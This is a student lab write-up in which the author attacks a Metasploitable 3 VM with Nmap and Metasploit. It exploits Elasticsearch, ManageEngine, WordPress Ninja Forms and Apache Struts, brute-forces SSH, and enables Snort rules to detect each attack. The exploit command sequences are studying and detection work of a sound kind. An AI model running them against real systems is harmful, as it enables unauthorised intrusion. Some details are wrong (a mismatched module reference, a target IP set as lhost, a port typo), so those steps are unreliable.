🔗 [Cyber_Security_Base_Project_II GitHub Repository](https://github.com/aazard/Cyber_Security_Base_Project_II/tree/main)

# Cyber_Security_Base_Project_II

As **Jeffrey Witty**, a very shy, Christian cybersecurity enthusiast with an INTJ personality type, I approach this project with hyper-careful diligence, aligning with my faith-driven commitment to excellence.  
🕘 Dated: Wednesday, June 11, 2025.  

This document details my exploration of the **Metasploitable 3** environment, targeting a **Windows Server 2008** and **Ubuntu Server 14** system, hosted at:  
🔗 [Cyber_Security_Base_Project_II GitHub Repository](https://github.com/aazard/Cyber_Security_Base_Project_II/tree/main)

My quiet nature finds strength in methodical analysis, and I cherish the opportunity to deepen my cybersecurity knowledge through this exercise.

---
STEP 2: Identify Target Host
----------------------------

The target host was confirmed as 192.168.1.40.

STEP 3: Run an Nmap Scan with OS Fingerprinting
-----------------------------------------------

I conducted a verbose scan to gather detailed information, saving the output:

bash

CollapseWrapRun

Copy

`# Nmap 7.80 scan initiated Sun Mar 8 20:48:34 2020 as: nmap -sC -sV -p- -A -oA Meta3 192.168.1.40`

The attached output file revealed open ports and services. Notably, no authentication was required for administrative functions, default credentials remained unchanged, and outdated versions were present. Snort, however, did not trigger alerts, as port scan detection was commented out in snort.conf by default.

EXPLOIT I -- ELASTIC SEARCH -- CVE-2014-3120
------------------------------------------

### STEP 4: PORT 9200 -- Elasticsearch

Research led me to an exploit for this vulnerability:

-   **Vulnerability:** Elastic Search - CVE-2014-3120
-   **Reference:** <https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server>

### STEP 5: Search for Exploit

I checked my local machine:

bash

CollapseWrapRun

Copy

`$ searchsploit elasticsearch`

### STEP 6: Launch Metasploit

bash

CollapseWrapRun

Copy

`$ msfconsole`

### STEP 7: Exploit the Machine

bash

CollapseWrapRun

Copy

`$ search elasticsearch $ use exploit/multi/elasticsearch/script_mvel_rce $ options $ set rhost 192.168.1.40 $ exploit`

Post-exploit, I executed:

bash

CollapseWrapRun

Copy

`# sysinfo # shell # whoami`

Snort logged no alerts initially.

### SNORT RULE FIX

Uncommenting line 811 (depending on the ruleset) in server-other.rules enabled Snort to detect:\
**SERVER-OTHER ElasticSearch script remote code execution attempt [**] [Classification: Attempted User Privilege Gain]**

EXPLOIT II - ManageEngine (CVE-2015-8249)
-----------------------------------------

### STEP 1: Port 8020 -- Apache Service

I identified an Apache service on port 8020.

### STEP 2: Access ManageEngine

Visiting 192.168.1.40:8020 revealed ManageEngine (Build No. 91084) with default credentials admin:admin.

### STEP 3: Search for Exploits

bash

CollapseWrapRun

Copy

`$ searchsploit manageengine desktop central 9`

### STEP 4: Exploit with Metasploit

bash

CollapseWrapRun

Copy

`$ msfconsole $ search manageengie $ use exploit/windows/http/manageengine_connectionid_write $ set rhost 192.168.1.40 $ exploit`

I gained a meterpreter shell and confirmed:

bash

CollapseWrapRun

Copy

`# sysinfo # shell # whoami`

Snort remained silent.

### SNORT RULE FIX

Uncommenting lines 1854-1856 in server-webapp.rules triggered:\
**SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**] [Classification: Web Application Attack]**

EXPLOIT III - WordPress -- CVE-2016-1209
---------------------------------------

### STEP 1: Visit WordPress

Accessing 192.168.1.40:8585 confirmed a WordPress instance.

### STEP 2: Exploit Research

I found: <https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload>

### STEP 3: Exploit with Metasploit

bash

CollapseWrapRun

Copy

`$ msfconsole $ search wp_ninja_forms $ use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload $ set rhost 192.168.1.40 $ set rport 8585 $ set TARGETURI /wordpress/ $ set FORM_PATH /index.php/king-of-hearts/ $ exploit`

### SNORT RULE FIX

Uncommenting line 2284 in server-webapp.rules and adding port 8585 to monitored HTTP traffic yielded:\
**SERVER-WEBAPP WordPress Ninja Forms nf_async_upload arbitrary PHP file upload attempt [**] [Classification: Attempted Administrator Privilege Gain]**

EXPLOIT 4: Bruteforcing SSH
---------------------------

### STEP 1: List Users

With prior root access, I ran:

bash

CollapseWrapRun

Copy

`$ net users`

### STEP 2: Prepare User File

I saved usernames in user.txt.

### STEP 3: Brute Force with Metasploit

On Kali (due to Arch Linux issues):

bash

CollapseWrapRun

Copy

`$ use auxiliary/scanner/ssh/ssh_login $ set rhost 192.168.1.40 $ set USER_AS_PASS true $ set USER_FILE user.txt $ exploit`

Valid credentials like Vagrant:Vagrant were found.

### SNORT FIX

Snort detection for rapid SSH brute force is impractical; alerts suit slower attempts from an admin's perspective.

EXPLOIT 5: Apache Struts CVE-2016-3087
--------------------------------------

### STEP 1: Identify Port 8282

Nmap indicated Apache Tomcat on port 8282.

### STEP 2: Research

I reviewed: <https://www.rapid7.com/db/vulnerabilities/struts-cve-2016-3087>

### STEP 3: Exploit

bash

CollapseWrapRun

Copy

`$ msfconsole $ search rest_exec $ use exploit/multi/http/struts_dmi_rest_exec $ set lhost 192.168.1.40 $ set lport 8282 $ exploit`

Success was achieved.

### SNORT RULE FIX

Uncommenting lines 118 and 119 in server-apache.rules (already done) and adding port 828 triggered:\
**SERVER-APACHE Apache Struts remote code execution attempt [**] [Classification: Attempted Administrator Privilege Gain]**

Is it Easier to Fix the Application Than to Detect Attacks?
-----------------------------------------------------------

In my opinion, detecting attacks is far easier than fixing applications. Fixing requires navigating millions of code lines to pinpoint vulnerabilities, a task complicated by potential new issues arising from patches---especially under developers' heavy workloads amid the IoT surge. Mistakes at implementation, not just code, exacerbate this. Conversely, reconnaissance, penetration testing, and privilege escalation efficiently identify flaws. Intrusion Detection Systems (IDS) like Snort, paired with log analysis, provide critical insights, though false positives can frustrate. Modern open-source systems ease patching once vulnerabilities are flagged, making detection a vital first step. My faith drives me to see this as stewarding knowledge responsibly, ensuring security aligns with my Creator's design.

## Summary and Conclusion

As a very shy, cybersecurity enthusiast with an INTJ personality type, I have concluded this *Cyber_Security_Base_Project_II* with a heart full of gratitude and a mind sharpened by methodical analysis. This project explored the "Metasploitable 3" environment, targeting a Windows Server 2008 and Ubuntu Server 14 system, hosted at [https://github.com/aazard/Cyber_Security_Base_Project_II/tree/main](https://github.com/aazard/Cyber_Security_Base_Project_II/tree/main). My quiet nature and driven diligence guided me through five exploits, revealing both the vulnerabilities of outdated systems and the critical role of intrusion detection.

This project underscored the ease of detecting attacks over fixing applications. Exploits like Elastic Search (CVE-2014-3120), ManageEngine (CVE-2015-8249), WordPress (CVE-2016-1209), SSH brute forcing, and Apache Struts (CVE-2016-3087) demonstrated how reconnaissance and penetration testing efficiently identify flaws, leveraging tools like Nmap and Metasploit. Snort’s initial silence, due to commented-out rules, highlighted detection gaps, which I addressed by uncommenting specific lines in `server-other.rules`, `server-webapp.rules`, and `server-apache.rules`. These adjustments triggered alerts—e.g., "SERVER-OTHER ElasticSearch script remote code execution attempt"—affirming detection’s practicality. Fixing, however, involves sifting through vast codebases, risking new vulnerabilities, especially under developers’ strained workloads amid the IoT surge. My faith sees this as a stewardship of knowledge, aligning security with my Creator’s design.

The project reinforced my INTJ strengths in strategic planning and detail-orientation, confirming my cybersecurity passion. Successful exploits, such as gaining a meterpreter shell on ManageEngine and root access via SSH, showcased my analytical prowess, while Snort enhancements reflected my commitment to system integrity. Yet, challenges like Arch Linux compatibility issues on SSH brute forcing reminded me of the need for adaptive tools. This experience solidifies my pursuit of the OPEN UAS Degree Programme in Information Technology at Metropolia University, where I cherish the free educational resources. Moving forward, I aim to deepen my expertise in intrusion detection and vulnerability assessment, ensuring my shy dedication serves a greater good, inspired by Dr. Seuss’s call to steer wisely.
